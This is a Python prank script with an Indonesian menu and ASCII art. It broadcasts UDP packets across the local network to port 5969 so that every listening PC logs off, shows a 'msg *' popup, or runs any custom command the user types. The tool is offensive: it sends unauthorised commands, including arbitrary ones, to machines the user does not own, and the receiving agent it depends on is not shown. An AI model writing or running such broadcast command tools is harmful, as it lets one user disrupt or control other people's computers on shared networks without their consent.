import socket
from time import sleep
from tqdm import tqdm

def peringatan():
    print(""" 

        Yaelah rul, masa gitu aja salah
        """)
    sleep(1.5)
    return(pilihan("wangy")) 

def custom():
	pass


def cucuck():
    print("""
     ██████╗██╗   ██╗ ██████╗██╗   ██╗██╗  ██╗
    ██╔════╝██║   ██║██╔════╝██║   ██║██║ ██╔╝
    ██║     ██║   ██║██║     ██║   ██║█████╔╝ 
    ██║     ██║   ██║██║     ██║   ██║██╔═██╗ 
    ╚██████╗╚██████╔╝╚██████╗╚██████╔╝██║  ██╗
     ╚═════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝  by : DarulFebri""")


def pesan(apatuch):
	main("msg *  {}".format(apatuch),"pesan")


def main(perintah,lagi):
    msg = perintah.encode()
    ipmanual="192.168.100.167" #kendala lain
    host = socket.gethostname()
    ipadd = socket.gethostbyname(host)
    kocak = 5
    print("  [+]  IP yang dipakai : {}".format(ipadd))
    sleep(1)
    print("  [*]  Mengitim Perintah..")
    sleep(1)
    
    while True:
        

        for i in "lanjut": 
                     
            soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            #sock=socket.socket()
            soket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                       
            soket.bind((ipadd,0))
            
            soket.sendto(msg, ("255.255.255.255", 5969))
            soket.close()
            kocak = (kocak-1)
            if kocak == 0:
                sleep(1)
                if lagi == "custom":
                	print("""  [OK] Perintah '{}' Udah Kekirim Rul.

                		""".format(cus))
                	sleep(2)
                if lagi == "pesan":

                	print("  [OK] Perintah telah di-execute")
                	sleep(2)
                	print("""

		PESAN '{}' UDAH TERKIRIM RUL ! 

                		""".format(pes))
            		
                if lagi == 0:
                	print("  [OK] Perintah telah di-execute")
                	sleep(5)
                	print('''


                            	SELAMAT DATANG DI JAMAN PURBA :D






	           (                 ,&&&.
	            )                .,.&&
	           (  (              \=__/
	               )             ,'-'.
	         (    (  ,,      _.__|/ /|  
	          ) /\ -((------((_|___/ |
	        (  // | (`'      ((  `'--|
	      _ -.;_/ \\\--._     \\\\ \\-._/.    -DarulFer
	     (_;-// | \ \-'.\   <_,\_\`--'|   -jrei
	     ( `.__ _  ___,')      <_,-'__,'
	     `'(_ )_)(_)_)




     ''')

                in2=input(" Tulis 'Keluar' untuk Keluar\n  >")
                if in2:
                    exit()
                else:
                    exit()


    #return 0

def loding(d,dk,de):
    for i in tqdm(range(d), desc=de):
            sleep(dk)

def pilihan(eek):
    global pes,cus
    if eek == "bau":
        pilihan()
    elif eek == "wangy":
        pass
    else:
        exit()
    garis =(19*"="+2*">")
    print('''
 {}
  Pilih Rul
 {}
 1.Log off Semua PC
 2.Tampilkan Pesan 
 3.Perintah custom
 '''.format(garis,garis))

    in1=input("pilih (1/2/3) : ")

    if in1 == '1': #yoi
        loding(1000,0.001,"Menyiapkan")
        main("logoff",0) # jangan terlalu jahat lah ya :D

    if in1 == '2':
    	pes = input(" >> Masukin Pesannya Rul : ")
    	pesan(pes)

    if in1 == '3':
    	cus = input("  Masukkan Perintah Custom Rul : ")
    	main(cus,"custom")
    
    else:
        peringatan()

def awalan():
    sleep(1)
    cucuck()
    sleep(1)
    pilihan("wangy")



awalan()


# gunterdibawah di hide karena cmd tidak tahu objek titik titik 

'''



⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⢀⣠⡀⠀⠀⠀⠀⠀⣼⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⢠⣿⣿⣿⡄⠀⠀⠀⣼⢃⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣆⠀⠀
⠀⣿⣿⣿⣿⡇⠀⠀⣰⣿⠋⠁⠀⠈⢹⣦⠀⠀⠀⢀⡴⠛⠋⠙⠳⣄⠀⠀⠘⣿⣿⣿⣿⣿⠀⠀
⢸⣿⣿⣿⣿⡇⠀⢀⣿⣿⣦⣤⣤⣶⣿⣿⡆⠀⠀⣿⣦⣀⣀⣠⣴⣿⡇⠀⠀⣿⣿⣿⣿⣿⡇⠀
⢸⣿⣿⣿⣿⣿⠀⢸⠏⢿⡋⠁⠈⠙⣿⣿⣤⢤⣄⢿⡿⠛⠛⠻⣿⣿⠇⠀⠀⣿⣿⣿⣿⣿⡇⠀
⢸⣿⣿⣿⣿⣿⣆⢸⠀⠀⠉⢛⣶⣿⣋⣁⣀⣀⣸⠋⠙⠶⠤⠴⠞⠋⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀
⠀⢻⣿⣿⣿⣿⣿⣿⡆⠀⠀⠉⠉⠉⢉⣿⡿⣋⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⡇⠀
⠀⠀⠙⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠰⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀
⠀⠀⠀⠀⠉⠛⠻⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⢻⣿⣿⢿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⣡⣿⣿⣿⠸⣇⠀  -Gunter
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣸⣿⡄
⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⢿⣿⣿⡿⠿⢋⣴⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠼⠷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⠟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣀⡀⠉⢓⡶⠶⠤⢤⣤⣀⣀⠀⠀⠀⠀⣀⣀⣠⡤⢿⡟⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠋⠀⠀⠀⠀⠀⠈⠉⠉⠻⣟⣉⡉⠉⢀⠀⢸⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠋⠙⠋⠀⠀⠀⠀⠀
'''